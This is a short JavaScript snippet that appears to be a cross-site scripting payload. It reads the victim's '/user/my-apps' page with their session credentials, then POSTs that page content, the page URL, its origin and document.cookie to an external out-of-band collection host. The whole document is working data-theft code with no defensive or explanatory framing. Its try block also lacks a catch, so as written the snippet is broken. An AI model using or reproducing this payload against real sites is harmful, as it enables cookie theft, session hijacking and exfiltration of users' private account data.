(async () => {
  try {
   
    const res  = await fetch('/user/my-apps', { credentials: 'include' });
    const data = await res.text();

  await fetch('https://hsrjvzfyftnlzigkbkplqcrzy9etsscvd.oast.fun', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    url: location.href,
    origin: location.origin,
    cookies: document.cookie,
    response: data
  })
});
})();